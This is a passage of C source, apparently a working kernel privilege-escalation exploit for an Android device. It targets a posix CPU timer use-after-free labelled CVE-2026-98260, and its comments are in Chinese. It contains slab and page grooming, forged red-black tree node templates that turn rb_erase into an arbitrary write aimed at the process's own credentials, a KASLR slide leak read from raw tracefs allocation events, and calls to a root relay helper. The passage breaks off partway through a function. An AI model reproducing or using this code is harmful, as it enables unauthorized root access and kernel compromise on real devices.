/*
 * wr1.c — CVE-2026-98260 写原语验证（第一笔受控写）
 *
 * 目标：把自己 private cred 的 gid/suid 清零 (cred+8)，用 getgid() 直接观测。
 *
 * ===== 本机反汇编结论（5.10.43 / KirinV90E，2026-10-28 复核）=====
 *
 * [1] tail 路径必须用 **CLOCK_PROCESS_CPUTIME_ID**（不是 THREAD 时钟）
 *     posix_cpu_timer_create (0x102449b4)：
 *        pid==0 且 perthread → p = current
 *        pid==0 且 process   → p = current->signal->group_leader   （signal+0x178）
 *     posix_cpu_timer_del (0x10245354)：p 用一个 struct pid 解析，
 *        ldr x8,[timer+0xb0] ; pid_task(pid, type) ; container_of(-> pids[type].node)
 *        type = CPUCLOCK_PERTHREAD ? PIDTYPE_PID : PIDTYPE_TGID
 *        —— 也就是 process timer 解析的是 **old leader**（de_thread 之后 TGID 链表仍挂 L）
 *     __lock_task_sighand(p) == NULL  → 0x10245558（-ESRCH），**不做 timerqueue_del**
 *        ⇒ 节点留在 tree 里，对象却被 exit_itimers 释放  ⇒ 这就是 UAF 窗口
 *
 * [2] 谁清理哪个 tree
 *     begin_new_exec+0x51c  bl release_task        (de_thread 释放 old leader)
 *     begin_new_exec+0x870  posix_cpu_timers_exit(me)   ← 只清 me->posix_cputimers (0x9e8..)
 *     begin_new_exec+0x880  exit_itimers(me->signal)   ← 释放对象（process timer 的节点清不掉）
 *     release_task+0x...    posix_cpu_timers_exit(tsk) + (group_dead) signal->posix_cputimers
 *                           signal 的 bases[0]=0x118 / leftmost b0=0x130 / b1=0x148 / b2=0x160
 *     ⇒ exec 阶段留下的 stale node 只在 **父进程 reap(zombie)** 时才被走到。
 *
 * [3] 写原语形状（rb_erase Case 2，最干净的一条）
 *     posix_cpu_timers_exit 0x102433ec 的循环：
 *       x20 = [root+0x10]               ; leftmost
 *       next = rb_next(x20)             ; 前驱/后继，无环检测
 *       [root+0x10] = next              ; **先写 leftmost**
 *       rb_erase(x20, root)             ; 0x10047790
 *       [x20] = x20 ; [x20+0x20] = 0    ; RB_CLEAR_NODE + it.cpu.head=0
 *       重复直到 leftmost == 0
 *
 *     rb_erase (0x10047790) 三个分支：
 *        Case1  tmp==0 (无左子)          : root->rb_node = node->right
 *        Case2  tmp!=0 && child==0       : 0x10047940
 *                 x10 = [node]          ; pc
 *                 str x10, [tmp]        ; ***(u64*)(node->rb_left) = node->pc***   ← 任意地址写
 *                 parent = pc & ~3 ; parent==0 → root->rb_node = tmp, 无 rebalance
 *        Case3  双子                           : 复杂, 会解引用子节点
 *
 *     ⇒ 模板 A{pc=0, right=0, left=C}：
 *         rb_next(A) = 0（pc&~3==0） ⇒ leftmost 清零, 循环一轮就结束
 *         rb_erase 走 Case2 且 parent==0   ⇒ *(u64*)C = 0, 无 rebalance, **不读 C 的任何字节**
 *       这就是"零写"原语：目标地址只受 A->rb_left 约束，对 C 内容零要求。
 *
 * [4] 页面回收（阶段 B/C 已验证）
 *     进程级 timer 对象在 posix_timers_cache (0x110, 30/slab, order-1)。
 *     让 victim 独占 4 个满 slab → 删掉 119 个只留 1 个 → 6 个 filler 各留 1 个
 *     制造 partial slab 压力 → exec 释放最后一个对象时 slab 变空且 nr_partial>=5
 *     ⇒ discard_slab 回到 buddy ⇒ pipe 喷射可精确拿回该 8KB。
 *
 * ===== 安全闸门 =====
 *   trace 里必须同时看到：
 *     (a) `mm_page_free: pfn=<head> order=1`（= 我们的 slab 真的被 discard）
 *     (b) `mm_page_alloc: pfn=<node_pfn>` 的 ts >= (a) 的 ts   ← 我方 pipe 页
 *     (c) 同一 8KB 块的另一半 pfn 也被分到（可选加分项，仅打印）
 *   闸门不过 ⇒ PARKED：**不 reap，不退出**，保持 pipe 与 zombie 共存。
 *   闸门过了但页面其实不是我们的 ⇒ 最坏是 rb_erase 解引用野指针（Case1/2 不读子节点，
 *   只有 rb_next 的 `[A+8]`/`[A+0x10]` 会读），风险已降到最低。
 *
 * 依赖：/data/local/tmp/dirtyinit（root relay，读 stdin EOF 后执行 shell 命令）
 * 用法：wr1 [-p npipe]
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdarg.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>

#define PAGE_OFFSET   0xffffff8000000000ULL
#define TRACE_DIR     "/sys/kernel/tracing"
#define RELAY         "/data/local/tmp/dirtyinit"

#define REQ_CRED      0xa8ULL      /* sizeof(struct cred) */
#define REQ_KITIMER   0x110ULL     /* sizeof(struct k_itimer) */
#define KIT_NODE      0x88ULL      /* it.cpu.node (rb_node: pc/right/left) */
#define CRED_GID      0x8ULL       /* gid(+8) + suid(+0xc) 同一个 8 字节 */

#define NT            631          /* 631 = 21 个满 slab (30/slab) + 1;
                                     * 最后 1 个把 active slab 顶到新 slab 上,
                                     * 于是前面 21 个"全是我们"的 slab 都不是 active,
                                     * 释放变空时 SLUB 才会走 discard_slab。 */
#define NFILL         6
#define NPF           30
#define NREADER       24
#define NSPRAY        64          /* pipe 数: 64 × 1MB = 16384 页 = pipe-user-pages-soft 上限 */
#define SK_PAIRS      128         /* socketpair 对数: 128 × 16MB = 2GB 压页能力 */
#define SPRAY_SZ      (1 << 20)

/* ---------------- 小工具 ---------------- */
static long long now_us(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000LL + t.tv_nsec / 1000;
}
static int pin_cpu(int cpu)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    return sched_setaffinity(0, sizeof(s), &s);
}
static int last_cpu(void)
{
    cpu_set_t s;
    if (sched_getaffinity(0, sizeof(s), &s)) return -1;
    int last = -1;
    for (int i = 0; i < CPU_SETSIZE; i++) if (CPU_ISSET(i, &s)) last = i;
    return last;
}

/* ---------------- root relay：每条命令一个 dirtyinit 进程 ---------------- */
static int g_norelay = 0;      /* -0: 纯 shell 起手，relay_q 改为直接 open/write tracefs */
static int g_selfchk = 0;      /* -1: 只做 relay 替代 / 写权限自检后退出 */

/* 解析 "echo <val> > <path>" 并直接写文件（不经 shell、不 fork）。
 * 覆盖 wr1.c 里全部 relay_q 调用格式： echo VAL > PATH / echo > PATH */
static void norelay_echo(const char *cmd)
{
    const char *p = cmd;
    while (*p == ' ' || *p == '\t') p++;
    if (strncmp(p, "echo", 4)) return;
    p += 4;
    while (*p == ' ' || *p == '\t') p++;
    char val[128];
    int vi = 0;
    while (*p && *p != '>' && *p != '\n') {
        if (vi < (int)sizeof val - 1) val[vi++] = *p;
        p++;
    }
    val[vi] = 0;
    while (vi > 0 && (val[vi - 1] == ' ' || val[vi - 1] == '\t')) val[--vi] = 0;
    const char *gt = strchr(p, '>');
    if (!gt) return;
    const char *q = gt + 1;
    while (*q == ' ' || *q == '\t') q++;
    char pbuf[256];
    int pi = 0;
    while (*q && *q != '\n' && pi < (int)sizeof pbuf - 1) pbuf[pi++] = *q++;
    pbuf[pi] = 0;
    while (pi > 0 && (pbuf[pi - 1] == ' ' || pbuf[pi - 1] == '\t')) pbuf[--pi] = 0;
    if (!pbuf[0]) return;
    int fd = open(pbuf, O_WRONLY | O_CLOEXEC);
    if (fd < 0) {
        printf("[N] WR FAIL %s (val='%s'): %s\n", pbuf, val, strerror(errno));
        return;
    }
    char out[160];
    int n;
    if (val[0]) n = snprintf(out, sizeof out, "%s\n", val);
    else { out[0] = '\n'; n = 1; }
    ssize_t w = write(fd, out, (size_t)n);
    if (w != (ssize_t)n) printf("[N] WR SHORT %s val='%s': %s (%zd/%d)\n", pbuf, val, strerror(errno), w, n);
    close(fd);
}

static int wr_rc(const char *path, const char *val)
{
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -errno;
    ssize_t n = write(fd, val, strlen(val));
    int e = (n == (ssize_t)strlen(val)) ? 0 : -errno;
    close(fd);
    return e;
}

/* ================= 纯 shell（PURESH）filemap pfn 通道 =================
 * kmem 事件对 shell 恒 -13，本通道只用 filemap 事件（shell 可开）拿页的物理 pfn：
 *   ① 写空洞文件 → 解析 mm_filemap_add_to_page_cache 得 ofs→pfn；
 *   ② 挑物理相邻(pfn 偶 + pfn^1 同文件)的页对，posix_fadvise(DONTNEED) 还给 buddy；
 *   ③ victim 的 posix_timers_cache slab(order-1/8KB) 优先吃掉这些空洞；
 *   ④ exec 窗口内喷涂第二个文件；add 事件里出现空洞 pfn ⇒ 该 8KB 块被我们抢回，
 *      GATE=PASS，用 H 直接算出 node_va（不再需要 kmem 泄漏）。
 */
#define PS_MAXPAIR 128
static int g_puresh = 0;
static int g_ps_npair = 24;                 /* 目标空洞对数 */
static uint64_t g_ps_hole[PS_MAXPAIR];      /* 每对的 8KB 基页 pfn(偶数) */
static uint64_t g_ps_ho[PS_MAXPAIR][2];     /* 每对两页在空洞文件里的 ofs */
static int g_ps_nhole = 0;
static char g_ps_ino[32];
static int g_ps_hfd = -1;
static uint64_t g_ps_H = 0;
#define PS_HOLE_FILE  "/data/local/tmp/.kkpg"
#define PS_SPRAY_FILE "/data/local/tmp/.kkpg2"

struct psadd { uint64_t ofs, pfn; };

static void ps_wr(const char *path, const char *val)
{
    int e = wr_rc(path, val);
    if (e) printf("[PS] WR FAIL %s='%s' rc=%d (%s)\n", path, val, e, strerror(-e));
}
static void ps_event(const char *ev, int on)
{
    char p[192];
    snprintf(p, sizeof p, "%s/events/filemap/%s/enable", TRACE_DIR, ev);
    ps_wr(p, on ? "1" : "0");
}
/* 诊断结束的统一出口：关事件/关 tracing，删掉空洞与喷涂文件，正常退出。
 * 注意：绝不能用外部 kill -9 清理本进程——在 init 域回收时该内核会 UAF panic。 */
static void ps_cleanup_exit(int code)
{
    ps_event("mm_filemap_add_to_page_cache", 0);
    ps_event("mm_filemap_delete_from_page_cache", 0);
    ps_wr(TRACE_DIR "/tracing_on", "0");
    if (g_ps_hfd >= 0) close(g_ps_hfd);
    unlink(PS_HOLE_FILE);
    unlink(PS_SPRAY_FILE);
    fflush(stdout);
    _exit(code);
}
/* /proc/slabinfo 里 posix_timers_cache 一行（用于确认 slab 是否增长/保留） */
static const char *ps_slab_pt(void)
{
    static char line[256];
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return "(no slabinfo)";
    line[0] = 0;
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "posix_timers_cache", 18)) break;
        line[0] = 0;
    }
    fclose(f);
    if (!line[0]) return "(absent)";
    line[strcspn(line, "\n")] = 0;
    return line;
}

/* 扫 trace，收集本 ino 的 add 行 (ofs,pfn)。ofs/pfn 均为十进制明文。 */
static int ps_scan_adds(const char *ino, struct psadd *o, int max)
{
    int fd = open(TRACE_DIR "/trace", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    size_t cap = 8u << 20, n = 0;
    char *b = malloc(cap + 1);
    if (!b) { close(fd); return -1; }
    for (;;) {
        if (n + 65536 > cap) {
            char *nb = realloc(b, cap * 2 + 1);
            if (!nb) break;
            b = nb; cap *= 2;
        }
        ssize_t r = read(fd, b + n, 65536);
        if (r <= 0) break;
        n += (size_t)r;
    }
    b[n] = 0;
    close(fd);
    int cnt = 0;
    size_t i = 0;
    while (i < n && cnt < max) {
        size_t j = i;
        while (j < n && b[j] != '\n') j++;
        if (j > i) {
            char save = b[j];
            b[j] = 0;
            char *line = b + i;
            if (strstr(line, ": mm_filemap_add_to_page_cache:")) {
                char *q = strstr(line, " ino ");
                char *pf = strstr(line, "pfn=");
                char *of = strstr(line, "ofs=");
                if (q && pf && of) {
                    char itok[32] = { 0 };
                    sscanf(q + 5, "%31s", itok);
                    if (!strcmp(itok, ino)) {
                        o[cnt].pfn = strtoull(pf + 4, NULL, 10);
                        o[cnt].ofs = strtoull(of + 4, NULL, 10);
                        cnt++;
                    }
                }
            }
            b[j] = save;
        }
        i = j + 1;
    }
    free(b);
    return cnt;
}

static void ps_grid(unsigned char *t, int start, uint64_t wrv, int sk_lo, int sk_hi);
static void build_ins_tmpl(unsigned char *tmpl, int off);

/* 这些全局原本定义在 ps_make_holes 之后；新链路要在建洞时写模板，提前声明。 */
static uint64_t g_head_pfn, g_node_pfn;
static uint64_t g_cred, g_node_va, g_target;
static int g_dverify;
static uint64_t g_gtgt, g_gval;

/* 建空洞：写 PS_HOLE_FILE → 解析 add → 选物理相邻页对 → fadvise 归还 buddy。 */
static int ps_make_holes(int want)
{
    int npages = want * 16;
    if (npages < 512) npages = 512;
    if (npages > 8192) npages = 8192;
    if (want > PS_MAXPAIR) want = PS_MAXPAIR;
    int fd = open(PS_HOLE_FILE, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { printf("[PS] 空洞文件 open: %s\n", strerror(errno)); return -1; }
    static unsigned char pg[4096];
    memset(pg, 0x41, sizeof pg);
    wr_rc(TRACE_DIR "/trace", "\n");
    int wrote = 0;
    for (int i = 0; i < npages; i++)
        if (pwrite(fd, pg, 4096, (off_t)i * 4096) == 4096) wrote++;
        else break;
    fsync(fd);                       /* 脏页必须落盘，否则 fadvise 不会丢 */
    struct stat st;
    if (fstat(fd, &st) != 0) { close(fd); return -1; }
    snprintf(g_ps_ino, sizeof g_ps_ino, "%llx", (unsigned long long)st.st_ino);
    static struct psadd adds[16384];
    int na = ps_scan_adds(g_ps_ino, adds, 16384);
    printf("[PS] 空洞文件 ino=%s wrote=%d add=%d\n", g_ps_ino, wrote, na);
    if (na <= 0) { close(fd); return -1; }
    g_ps_nhole = 0;
    for (int i = 0; i < na && g_ps_nhole < want; i++) {
        uint64_t pf = adds[i].pfn;
        if (pf & 1ULL) continue;
        int f0 = 0, f1 = 0, dup = 0;
        uint64_t of0 = 0, of1 = 0;
        for (int k = 0; k < na; k++) {
            if (adds[k].pfn == pf)      { of0 = adds[k].ofs; f0 = 1; }
            else if (adds[k].pfn == pf + 1) { of1 = adds[k].ofs; f1 = 1; }
        }
        if (!f0 || !f1) continue;
        for (int k = 0; k < g_ps_nhole; k++)
            if (g_ps_hole[k] == pf) { dup = 1; break; }
        if (dup) continue;
        g_ps_hole[g_ps_nhole] = pf;
        g_ps_ho[g_ps_nhole][0] = of0;
        g_ps_ho[g_ps_nhole][1] = of1;
        g_ps_nhole++;
    }
    /* ---- 新链路：fadvise 之前就把假 rb_node 模板写进空洞页 ----
     * 页被丢掉后物理内容保留；victim 的 posix_timers slab 吃下这对页时，
     * 假节点已经在 slab 对象里（tail 页 off=0xF58 = 对象 29 的 node 槽）。
     * PSBENIGN=1 时不写模板，只做"slab 是否落在空洞页"的安全验证。 */
    if (g_ps_nhole > 0) {
        uint64_t Hc = g_ps_hole[g_ps_nhole - 1];
        uint64_t common_page = PAGE_OFFSET + (Hc + 1ULL) * 4096ULL;
        uint64_t common_pnode = common_page + 0x418ULL;
        uint64_t wrv = (g_gtgt && !g_dverify) ? g_gval : common_pnode;
        int benign = getenv("PSBENIGN") != NULL;
        if (!benign) {
            static unsigned char tm[4096];
            for (int i = 0; i < g_ps_nhole; i++) {
                memset(tm, 0, sizeof tm);
                ps_grid(tm, 0x88, wrv, 0, 0);
                pwrite(fd, tm, 4096, (off_t)g_ps_ho[i][0]);
                memset(tm, 0, sizeof tm);
                if (i == g_ps_nhole - 1) {
                    build_ins_tmpl(tm, 0xF58);
                    ps_grid(tm, 0x78, wrv, 0x400, 0x700);
                } else {
                    ps_grid(tm, 0x78, wrv, 0, 0);
                }
                pwrite(fd, tm, 4096, (off_t)g_ps_ho[i][1]);
            }
            fsync(fd);               /* 模板也必须干净，fadvise 才会丢页 */
        }
        g_ps_H = Hc;
        g_node_va = common_page + 0xF58ULL;
        g_node_pfn = Hc + 1ULL;
        g_head_pfn = Hc;
        printf("[PS] 模板预置: common_pfn=%llu node=%#llx Pnode=%#llx wrv=%#llx benign=%d\n",
               (unsigned long long)(Hc + 1), (unsigned long long)g_node_va,
               (unsigned long long)common_pnode, (unsigned long long)wrv, benign);
    }
    /* 先把一份大 filler 文件整页丢掉：灌满 per-cpu page list，使随后释放的空洞页
     * 在 pcp 溢出时被 flush 到 buddy 并两两合并成 order-1；这批是"最新进入
     * free_area[1]"的块，SLUB 下次分配优先取走，victim 的 22 个 slab 才会落在洞里。 */
    {
        int ff = open("/data/local/tmp/.kkpgf", O_RDWR | O_CREAT | O_TRUNC, 0600);
        if (ff >= 0) {
            int fn = 4096;
            for (int i = 0; i < fn; i++)
                if (pwrite(ff, pg, 4096, (off_t)i * 4096) != 4096) break;
            fsync(ff);
            posix_fadvise(ff, 0, 0, POSIX_FADV_DONTNEED);
            close(ff);
        }
    }
    int freed = 0;
    for (int i = 0; i < g_ps_nhole; i++) {
        if (posix_fadvise(fd, (off_t)g_ps_ho[i][0], 4096, POSIX_FADV_DONTNEED) == 0) freed++;
        if (posix_fadvise(fd, (off_t)g_ps_ho[i][1], 4096, POSIX_FADV_DONTNEED) == 0) freed++;
    }
    printf("[PS] 空洞 pairs=%d fadvise_ok=%d pfn:", g_ps_nhole, freed);
    for (int i = 0; i < g_ps_nhole; i++)
        printf(" %llu", (unsigned long long)g_ps_hole[i]);
    printf("\n");
    close(fd);
    return g_ps_nhole;
}

/* -1 自检：把 relay_q 会碰到的每个文件逐个试读写，打印真实 rc。
 * 只读/写 0666 文件，写后尽量恢复，不碰 GATE、不建树、不 reap。 */
static void norelay_selfcheck(void)
{
    printf("== SELFCHECK norelay uid=%d euid=%d ==\n", (int)getuid(), (int)geteuid());
    const char *probe[][2] = {
        { TRACE_DIR "/tracing_on", "1" },
        { TRACE_DIR "/trace", "\n" },
        { TRACE_DIR "/trace_clock", "mono" },
        { TRACE_DIR "/buffer_size_kb", "16384" },
        { TRACE_DIR "/current_tracer", "nop" },
        { TRACE_DIR "/set_ftrace_pid", "0" },
        { TRACE_DIR "/events/enable", "0" },
        { TRACE_DIR "/events/sched/sched_process_exit/enable", "1" },
        { TRACE_DIR "/events/sched/sched_process_exit/enable", "0" },
        { TRACE_DIR "/events/signal/signal_generate/enable", "1" },
        { TRACE_DIR "/events/signal/signal_generate/enable", "0" },
        { TRACE_DIR "/events/vmscan/mm_vmscan_direct_reclaim_begin/enable", "1" },
        { TRACE_DIR "/events/vmscan/mm_vmscan_direct_reclaim_begin/enable", "0" },
        { TRACE_DIR "/events/kmem/kmem_cache_alloc/enable", "1" },
        { TRACE_DIR "/events/kmem/mm_page_alloc/enable", "1" },
        { TRACE_DIR "/events/kmem/mm_page_free/enable", "1" },
        { TRACE_DIR "/events/kmem/mm_page_free/filter", "pfn!=0" },
        { "/proc/sys/kernel/perf_event_paranoid", "-1" },
        { "/proc/self/oom_score_adj", "-1000" },
    };
    int n = (int)(sizeof probe / sizeof probe[0]);
    for (int i = 0; i < n; i++) {
        const char *p = probe[i][0];
        char cur[64] = { 0 };
        int rd = open(p, O_RDONLY | O_CLOEXEC);
        int rdok = rd >= 0;
        if (rdok) {
            int r = read(rd, cur, sizeof cur - 1);
            if (r > 0) { cur[r] = 0; char *nl = strchr(cur, '\n'); if (nl) *nl = 0; }
            close(rd);
        }
        const char *w = probe[i][1];
        if (!strcmp(p, TRACE_DIR "/buffer_size_kb") && cur[0]) w = cur;
        if (!strcmp(p, TRACE_DIR "/trace_clock") && cur[0]) {
            int rc1 = wr_rc(p, w);
            int rc2 = wr_rc(p, cur);
            printf("  %-70s rd=%s cur='%s' wr('%s')=%d restore=%d\n",
                   p, rdok ? "OK" : "NO", cur, w, rc1, rc2);
            continue;
        }
        int rc = wr_rc(p, w);
        printf("  %-70s rd=%s cur='%s' wr('%s')=%d%s\n",
               p, rdok ? "OK" : "NO", cur, w, rc, rc ? strerror(-rc) : "");
        if (!strcmp(p, TRACE_DIR "/tracing_on")) wr_rc(p, "0");
    }
    /* raw 流只测读（wr1 的 leak_start 就是读这些） */
    for (int c = 0; c < 4; c++) {
        char pp[128];
        snprintf(pp, sizeof pp, TRACE_DIR "/per_cpu/cpu%d/trace_pipe_raw", c);
        int fd = open(pp, O_RDONLY | O_CLOEXEC | O_NONBLOCK);
        printf("  %-70s rd=%s%s\n", pp, fd >= 0 ? "OK" : "NO", fd < 0 ? strerror(errno) : "");
        if (fd >= 0) close(fd);
    }
    printf("== SELFCHECK END ==\n");
}

static int relay_sh(const char *cmd, char *out, size_t on)
{
    int in[2], ou[2];
    if (pipe(in) || pipe(ou)) return -1;
    pid_t p = fork();
    if (p < 0) { close(in[0]); close(in[1]); close(ou[0]); close(ou[1]); return -1; }
    if (p == 0) {
        dup2(in[0], 0); dup2(ou[1], 1); dup2(ou[1], 2);
        close(in[0]); close(in[1]); close(ou[0]); close(ou[1]);
        execl(RELAY, "dirtyinit", (char *)NULL);
        _exit(127);
    }
    close(in[0]); close(ou[1]);
    ssize_t w = write(in[1], cmd, strlen(cmd));
    (void)w;
    close(in[1]);                       /* EOF -> 执行 */
    size_t n = 0;
    while (out && on > 1 && (size_t)n < on - 1) {
        ssize_t r = read(ou[0], out + n, on - 1 - n);
        if (r <= 0) break;
        n += (size_t)r;
    }
    if (out && on) out[n] = 0;
    close(ou[0]);
    int st = 0;
    waitpid(p, &st, 0);
    return (int)n;
}
static void relay_q(const char *fmt, ...);

/* PARKED 常驻实例必须防 OOM。
 * 父进程一旦被 OOM killer 摘掉, 未 reap 的 victim 僵尸就被移交给 init,
 * init 在 release_task 里遍历那棵脏 timer 树 -> 内核 panic / 设备重启。
 * 2026-10-29 实测: load 32、free 只剩 5GB 时, PARKED 父进程被 OOM 杀掉,
 * 设备随即崩溃。这里用 root relay 把自己的 oom_score_adj 压到 -1000。 */
static void self_protect(void)
{
    relay_q("echo -1000 > /proc/%d/oom_score_adj", (int)getpid());
    printf("[SAFE] 已把 pid=%d 的 oom_score_adj 降到 -1000 (防 OOM 杀掉挂起实例)\n", (int)getpid());
}

static void relay_q(const char *fmt, ...)
{
    /* 注意: dirtyinit 自己解析 "cmd args > file"(不是 shell), 不支持 ';' 串联,
     * 也不支持写 /data/local/tmp(SELinux init 域). 一条命令一次调用. */
    char b[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap);
    va_end(ap);
    if (n <= 0 || n >= (int)sizeof b - 2) return;
    b[n++] = '\n';
    if (g_norelay) { norelay_echo(b); return; }
    relay_sh(b, NULL, 0);
}

/* ---------------- raw 泄漏采集 ---------------- */
#define MAXREC (1 << 16)
struct rec { int32_t pid; uint32_t kind; uint64_t ptr; };   /* kind: 0=cred 1=timer */
static struct rec *g_rec;
static volatile int g_nrec;
static volatile int g_stop;
static pthread_t g_rth;
static int g_fd[8], g_nfd;
static int g_ncpu = 6;            /* main 里按 affinity 修正 */
static int g_fdcpu[8];
static volatile long long g_fdbytes[8];

/* 诊断: 记录本进程自己的全部 kmem_cache_alloc (pid/cs/req) */
struct drec { int32_t pid; uint32_t req; uint64_t cs; };
static volatile struct drec g_d[128];
static volatile int g_dn;
static volatile int32_t g_self_tid;
static volatile int32_t g_watch;          /* 目的线程 tid */
static volatile int g_w_all;              /* pid==g_watch 的全部记录 */
static volatile int g_w110;               /* 任意 pid 的 req==0x110 记录数 */
static volatile int32_t g_w110_pid, g_w110_cs;
static volatile uint64_t g_w110_last_cs;
/* 诊断: 本进程 bytes_req==192 的记录原样留下, 用来判断 call_site/ptr 是真实地址还是被哈希 */
struct c192 { int32_t pid; uint64_t cs, ptr; };
static volatile struct c192 g_c192[16];
static volatile int g_c192_n;

/* prepare_creds: 0xffffffc0101e38d0 bl kmem_cache_alloc -> _RET_IP_ = +4
 * （cred_jar 被 SLUB merge 进 kmalloc-cg-192, 所以不能用 bytes_req=0xa8 过滤）
 * [2026-11-05] 真值来自 syms_shift.txt：0xffffffc0101e38d4 = prepare_creds+0x28
 * （旧值 0xffffffc0101638d4 少了 0x80000，对应 sve_get+0x1f4，纯属巧合能匹配） */
#define CRED_CS_LINK  0xffffffc0101e38d4ULL
/* do_timer_create+0xb8: x0=[posix_timers_cache] ; bl kmem_cache_alloc
 * -> _RET_IP_ = +4。用它过滤可以保证"每条记录 == 一次成功的 timer_create",
 * 记录的序号 == timer_t 数组下标（不会被别的 0x110 分配插队污染）。 */
#define TIMER_CS_LINK 0xffffffc0102bf748ULL
/* copy_process+0x228: bl kmem_cache_alloc(task_struct_cachep)
 * -> _RET_IP_ = +4。用它泄漏"刚 fork 出来的子进程"的 task_struct。 */
#define TASK_CS_LINK  0xffffffc0101930a8ULL
static uint64_t g_cred_cs, g_timer_cs, g_task_cs;
static uint64_t g_slide;                    /* 0 = 未指定 → 运行时自校准 (见 slide_learn) */
static volatile uint64_t g_slide_auto;      /* 由 req==0x110 记录的 call_site 反推的 slide */

static int is_kptr(uint64_t v) { return (v & 0xffff000000000000ULL) == 0xffff000000000000ULL; }
static int is_linear(uint64_t v) { return v >= 0xffffff8000000000ULL && v < 0xffffffc000000000ULL; }
/* kernel text (+slide) 落在 0xffffffc0.. 之上, 而线性映射/堆在它之下 */
static int is_text(uint64_t v) { return v >= 0xffffffc000000000ULL; }

/* ---------------- 免 root 自校准 slide ----------------
 * kmem_cache_alloc 的 call_site 是**原始**内核 text 地址 (trace_pipe_raw 是二进制,
 * 不经过 %p 哈希)。posix_timers_cache 的 object_size 恰为 0x110, 全内核只有
 * do_timer_create 会申请这个尺寸, 所以任意一条 req==0x110 记录就给出
 *     slide = call_site - TIMER_CS_LINK
 * 只需读 tracing/per_cpu/cpuN/trace_pipe_raw (0666), 不需要 root,
 * 也不需要被 SELinux 挡住的 printk_formats / kallsyms / kptr_restrict。
 * 在还没有任何 timer 分配时(例如 [B1] 之前), 退化为"页内偏移指纹":
 * KASLR 只平移 text, 页内偏移不变; 本机各次 boot 的 slide 均按 64KB 对齐,
 * 因此用 (cs & 0xffff) 比较, 与拿到 slide 后的全等匹配等价。 */
static void slide_learn(uint64_t cs)
{
    if (!is_text(cs)) return;
    if ((cs & 0xfffULL) != (TIMER_CS_LINK & 0xfffULL)) return;
    uint64_t cand = cs - TIMER_CS_LINK;
    if (!cand || cand > 0x10000000000ULL) return;
    if (!g_slide_auto) g_slide_auto = cand;
}
static uint64_t slide_eff(void) { return g_slide ? g_slide : g_slide_auto; }
static int cs_is(uint64_t cs, uint64_t link)
{
    uint64_t sl = slide_eff();
    if (sl) return cs == link + sl;
    return is_text(cs) && (cs & 0xffffULL) == (link & 0xffffULL);
}

static void scan_chunk(unsigned char *buf, size_t n)
{
    for (size_t o = 8; o + 40 <= n; o += 4) {
        uint16_t type;
        memcpy(&type, buf + o - 8, 2);
        if (type != 267) continue;                    /* kmem_cache_alloc */
        uint64_t cs, ptr, req;
        int32_t pid;
        memcpy(&cs, buf + o, 8);
        if (!is_kptr(cs) || (cs & 3)) continue;
        memcpy(&ptr, buf + o + 8, 8);
        memcpy(&req, buf + o + 16, 8);
        memcpy(&pid, buf + o - 4, 4);
        if (pid == g_self_tid) {
            int i = __sync_fetch_and_add(&g_dn, 1);
            if (i < 128) { g_d[i].pid = pid; g_d[i].req = (uint32_t)req; g_d[i].cs = cs; }
        }
        if (req == 0x110) {
            __sync_fetch_and_add(&g_w110, 1);
            g_w110_pid = pid;
            g_w110_last_cs = cs;
        }
        if (req == 0xc0 && pid == g_self_tid) {
            int i = __sync_fetch_and_add(&g_c192_n, 1);
            if (i < 16) { g_c192[i].pid = pid; g_c192[i].cs = cs; g_c192[i].ptr = ptr; }
        }
        if (pid == g_watch) __sync_fetch_and_add(&g_w_all, 1);
        /* 每见到一条 posix_timers_cache 分配, 就不花 root 地把 slide 校准出来 */
        if (req == REQ_KITIMER) slide_learn(cs);
        int kind = -1;
        if (req == REQ_KITIMER && cs_is(cs, TIMER_CS_LINK)) kind = 1;
        else if (cs_is(cs, CRED_CS_LINK)) kind = 0;
        else if (cs_is(cs, TASK_CS_LINK)) kind = 2;
        if (kind < 0) continue;
        if (!is_kptr(ptr) || (ptr & 7) || !is_linear(ptr)) continue;
        int i = __sync_fetch_and_add(&g_nrec, 1);
        if (i < MAXREC) { g_rec[i].pid = pid; g_rec[i].kind = (uint32_t)kind; g_rec[i].ptr = ptr; }
    }
}
static void *reader(void *arg)
{
    (void)arg;
    unsigned char *chunk = malloc(96 + (1u << 20));
    struct pollfd p[8];
    if (!chunk) return NULL;
    while (!g_stop) {
        int n = g_nfd;
        for (int i = 0; i < n; i++) { p[i].fd = g_fd[i]; p[i].events = POLLIN; p[i].revents = 0; }
        poll(p, n, 20);
        for (int i = 0; i < n; i++) {
            if (!(p[i].revents & POLLIN)) continue;
            ssize_t r = read(g_fd[i], chunk + 96, 1u << 20);
            if (r <= 0) continue;
            g_fdbytes[i] += r;
            scan_chunk(chunk, 96 + (size_t)r);
            memmove(chunk, chunk + (size_t)r, 96);
        }
    }
    free(chunk);
    return NULL;
}
static void leak_start(void)
{
    char path[128];
    g_nfd = 0;
    int nc = g_ncpu - 1;     /* 不能用 last_cpu(): 主线程已 pin 到单核 */
    if (nc < 0) nc = 0;
    for (int c = 0; c <= nc && g_nfd < 8; c++) {
        snprintf(path, sizeof path, TRACE_DIR "/per_cpu/cpu%d/trace_pipe_raw", c);
        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd >= 0) {
            int fl = fcntl(fd, F_GETFL);
            fcntl(fd, F_SETFL, fl & ~O_NONBLOCK);
            g_fdcpu[g_nfd] = c;
            g_fdbytes[g_nfd] = 0;
            g_fd[g_nfd++] = fd;
        } else {
            printf("[!] open cpu%d raw: %s\n", c, strerror(errno));
        }
    }
